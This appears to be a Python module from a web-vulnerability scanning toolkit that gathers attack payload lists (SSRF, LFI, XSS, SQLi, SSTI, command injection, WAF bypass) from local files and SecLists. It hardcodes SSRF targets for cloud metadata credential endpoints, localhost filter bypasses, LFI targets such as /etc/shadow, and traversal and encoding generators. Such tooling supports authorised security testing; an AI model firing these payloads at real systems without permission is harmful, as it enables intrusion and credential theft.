#!/usr/bin/env python3
"""
============================================================================
PAYLOAD MANAGER - Central Payload Loading & Combining System
============================================================================
Loads payloads from multiple sources:
1. Custom payloads from .data/payloads/
2. SecLists from /opt/wordlists/SecLists/
3. Module-specific inline payloads

Provides combined, deduplicated payload lists for each vulnerability category.
============================================================================
"""

import os
import re
from pathlib import Path
from typing import Dict, List, Optional, Set
from dataclasses import dataclass, field


@dataclass
class PayloadSource:
    """Represents a source of payloads."""
    path: str
    category: str
    priority: int = 1  # Higher priority = used first
    exists: bool = False
    count: int = 0


class PayloadManager:
    """Central payload management for all vulnerability scanners."""
    
    # Base directories for payloads
    CUSTOM_PAYLOADS_DIR = ".data/payloads"
    SECLISTS_DIR = "/opt/wordlists/SecLists"
    CUSTOM_WORDLISTS_DIR = ".data/wordlists"
    
    # Payload source mappings - ordered by priority
    PAYLOAD_SOURCES: Dict[str, List[str]] = {
        'ssrf': [
            '.data/payloads/ssrf/bypass.txt',
            '/opt/wordlists/SecLists/Fuzzing/SSRFPayloads.txt',
            '/opt/wordlists/SecLists/Server-Side-Request-Forgery/cloud-metadata.txt',
        ],
        'lfi': [
            '.data/payloads/lfi/waf_bypass.txt',
            '/opt/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt',
            '/opt/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt',
            '/opt/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt',
        ],
        'xss': [
            '.data/payloads/xss/waf_bypass.txt',
            '/opt/wordlists/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt',
            '/opt/wordlists/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt',
            '/opt/wordlists/SecLists/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt',
        ],
        'sqli': [
            '.data/payloads/sqli/waf_bypass.txt',
            '/opt/wordlists/SecLists/Fuzzing/SQLi/Generic-SQLi.txt',
            '/opt/wordlists/SecLists/Fuzzing/SQLi/quick-SQLi.txt',
        ],
        'ssti': [
            '.data/payloads/ssti/all_engines.txt',
            '/opt/wordlists/SecLists/Fuzzing/template-engines-expression.txt',
            '/opt/wordlists/SecLists/Fuzzing/template-engines-special-vars.txt',
        ],
        'rce': [
            '.data/payloads/rce/command_injection.txt',
            '/opt/wordlists/SecLists/Fuzzing/command-injection-commix.txt',
            '/opt/wordlists/SecLists/Fuzzing/UnixAttacks.txt',
        ],
        'redirect': [
            '/opt/wordlists/SecLists/Fuzzing/open-redirect-payloads.txt',
            '/opt/wordlists/SecLists/Discovery/Web-Content/redirect-payloads.txt',
        ],
        'crlf': [
            '/opt/wordlists/SecLists/Fuzzing/CRLF-Injection.txt',
        ],
        'bypass': [
            '.data/payloads/bypass/waf_techniques.txt',
            '/opt/wordlists/SecLists/Fuzzing/Unicode.txt',
        ],
        'directories': [
            '.data/wordlists/common.txt',
            '.data/wordlists/custom/admin_panels.txt',
            '.data/wordlists/custom/api_endpoints.txt',
            '.data/wordlists/custom/backup_files.txt',
            '/opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt',
            '/opt/wordlists/SecLists/Discovery/Web-Content/common.txt',
        ],
        'files': [
            '.data/wordlists/custom/backup_files.txt',
            '.data/wordlists/custom/js_sensitive.txt',
            '/opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt',
        ],
        'params': [
            '.data/wordlists/custom/hidden_params.txt',
            '/opt/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt',
        ],
        'subdomains': [
            '/opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt',
            '/opt/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt',
        ],
    }
    
    # In-memory payload cache
    _cache: Dict[str, List[str]] = {}
    _script_dir: Optional[str] = None
    
    @classmethod
    def set_base_dir(cls, base_dir: str):
        """Set the base directory for relative paths."""
        cls._script_dir = base_dir
    
    @classmethod
    def _resolve_path(cls, path: str) -> str:
        """Resolve relative paths to absolute."""
        if path.startswith('/'):
            return path
        if cls._script_dir:
            return os.path.join(cls._script_dir, path)
        return path
    
    @classmethod
    def _load_file(cls, filepath: str) -> List[str]:
        """Load payloads from a file, skipping comments and empty lines."""
        resolved = cls._resolve_path(filepath)
        if not os.path.exists(resolved):
            return []
        
        payloads = []
        try:
            with open(resolved, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    # Skip empty lines and comments
                    if line and not line.startswith('#'):
                        payloads.append(line)
        except Exception as e:
            print(f"[PayloadManager] Warning: Could not load {filepath}: {e}")
        
        return payloads
    
    @classmethod
    def get_payloads(cls, category: str, max_payloads: int = 500, 
                     dedupe: bool = True, os_filter: Optional[str] = None) -> List[str]:
        """
        Get combined payloads from all sources for a category.
        
        Args:
            category: Payload category (ssrf, lfi, xss, etc.)
            max_payloads: Maximum number of payloads to return
            dedupe: Whether to deduplicate payloads
            os_filter: Optional OS filter ('linux', 'windows', or None for both)
        
        Returns:
            List of payloads
        """
        cache_key = f"{category}_{max_payloads}_{os_filter}"
        
        if cache_key in cls._cache:
            return cls._cache[cache_key][:max_payloads]
        
        sources = cls.PAYLOAD_SOURCES.get(category, [])
        all_payloads: List[str] = []
        
        for source_path in sources:
            payloads = cls._load_file(source_path)
            all_payloads.extend(payloads)
        
        # OS-specific filtering
        if os_filter == 'linux':
            # Remove Windows-specific paths
            all_payloads = [p for p in all_payloads 
                          if not any(w in p.lower() for w in ['windows', 'win.ini', 'c:\\', 'c:/'])]
        elif os_filter == 'windows':
            # Remove Linux-specific paths
            all_payloads = [p for p in all_payloads 
                          if not any(l in p.lower() for l in ['/etc/', '/proc/', '/var/', '/home/'])]
        
        # Deduplicate while preserving order
        if dedupe:
            seen: Set[str] = set()
            unique_payloads = []
            for p in all_payloads:
                if p not in seen:
                    seen.add(p)
                    unique_payloads.append(p)
            all_payloads = unique_payloads
        
        cls._cache[cache_key] = all_payloads
        return all_payloads[:max_payloads]
    
    @classmethod
    def get_payload_file(cls, category: str, output_dir: str, 
                         max_payloads: int = 500) -> str:
        """
        Get payloads and write to a temporary file for use with tools.
        
        Args:
            category: Payload category
            output_dir: Directory to write the payload file
            max_payloads: Maximum payloads
        
        Returns:
            Path to the created payload file
        """
        payloads = cls.get_payloads(category, max_payloads)
        
        os.makedirs(output_dir, exist_ok=True)
        filepath = os.path.join(output_dir, f"{category}_payloads.txt")
        
        with open(filepath, 'w') as f:
            f.write('\n'.join(payloads))
        
        return filepath
    
    @classmethod
    def get_available_categories(cls) -> List[str]:
        """Get list of available payload categories."""
        return list(cls.PAYLOAD_SOURCES.keys())
    
    @classmethod
    def get_stats(cls) -> Dict[str, Dict]:
        """Get statistics about available payloads."""
        stats = {}
        for category, sources in cls.PAYLOAD_SOURCES.items():
            category_stats = {
                'sources': [],
                'total_payloads': 0,
                'unique_payloads': 0,
            }
            
            all_payloads = []
            for source in sources:
                resolved = cls._resolve_path(source)
                exists = os.path.exists(resolved)
                count = 0
                if exists:
                    payloads = cls._load_file(source)
                    count = len(payloads)
                    all_payloads.extend(payloads)
                
                category_stats['sources'].append({
                    'path': source,
                    'exists': exists,
                    'count': count,
                })
            
            category_stats['total_payloads'] = len(all_payloads)
            category_stats['unique_payloads'] = len(set(all_payloads))
            stats[category] = category_stats
        
        return stats
    
    @classmethod
    def print_stats(cls):
        """Print payload statistics to console."""
        stats = cls.get_stats()
        print("\n" + "=" * 60)
        print("  PAYLOAD MANAGER STATISTICS")
        print("=" * 60)
        
        for category, info in stats.items():
            print(f"\n[{category.upper()}]")
            print(f"  Total payloads: {info['total_payloads']}")
            print(f"  Unique payloads: {info['unique_payloads']}")
            print("  Sources:")
            for src in info['sources']:
                status = "✓" if src['exists'] else "✗"
                print(f"    {status} {src['path']} ({src['count']} payloads)")
        
        print("\n" + "=" * 60)


# SSRF-specific payload helpers
class SSRFPayloads:
    """SSRF-specific payload generation."""
    
    @staticmethod
    def get_cloud_metadata_urls() -> List[str]:
        """Get cloud metadata URLs for SSRF testing."""
        return [
            # AWS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/",
            # Kubernetes
            "https://kubernetes.default.svc/api/v1/",
        ]
    
    @staticmethod
    def get_localhost_bypasses() -> List[str]:
        """Get localhost bypass variations."""
        return [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://127.1/",
            "http://0.0.0.0/",
            "http://0/",
            "http://[::1]/",
            "http://127.0.0.1:80/",
            "http://2130706433/",  # Decimal
            "http://0x7f000001/",  # Hex
        ]
    
    @staticmethod
    def generate_with_callback(callback_url: str) -> List[str]:
        """Generate SSRF payloads with OOB callback URL."""
        return [
            callback_url,
            f"http://{callback_url.replace('http://', '').replace('https://', '')}",
            f"https://{callback_url.replace('http://', '').replace('https://', '')}",
        ]


# LFI-specific payload helpers
class LFIPayloads:
    """LFI-specific payload generation."""
    
    LINUX_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
    ]
    
    WINDOWS_FILES = [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\inetpub\\logs\\LogFiles",
    ]
    
    @classmethod
    def get_traversal_depths(cls, target_file: str, max_depth: int = 10) -> List[str]:
        """Generate path traversal payloads at various depths."""
        payloads = []
        for depth in range(1, max_depth + 1):
            traversal = "../" * depth
            payloads.append(f"{traversal}{target_file.lstrip('/')}")
        return payloads
    
    @classmethod
    def get_encoded_variants(cls, payload: str) -> List[str]:
        """Get URL-encoded variants of a payload."""
        import urllib.parse
        return [
            payload,
            urllib.parse.quote(payload),
            urllib.parse.quote(urllib.parse.quote(payload)),  # Double encode
            payload.replace("../", "..%2f"),
            payload.replace("../", "%2e%2e%2f"),
            payload.replace("../", "....//"),
        ]


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Payload Manager CLI")
    parser.add_argument("--stats", action="store_true", help="Show payload statistics")
    parser.add_argument("--category", "-c", help="Get payloads for category")
    parser.add_argument("--max", "-m", type=int, default=50, help="Max payloads to show")
    parser.add_argument("--base-dir", "-b", help="Base directory for relative paths")
    parser.add_argument("--test", action="store_true", help="Run self-test")
    
    args = parser.parse_args()
    
    if args.base_dir:
        PayloadManager.set_base_dir(args.base_dir)
    
    if args.stats:
        PayloadManager.print_stats()
    elif args.category:
        payloads = PayloadManager.get_payloads(args.category, args.max)
        print(f"\n[{args.category.upper()}] - {len(payloads)} payloads:")
        for p in payloads[:20]:
            print(f"  {p}")
        if len(payloads) > 20:
            print(f"  ... and {len(payloads) - 20} more")
    elif args.test:
        print("Running payload manager self-test...")
        PayloadManager.set_base_dir(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        PayloadManager.print_stats()
        print("\n✓ Self-test passed")
    else:
        parser.print_help()
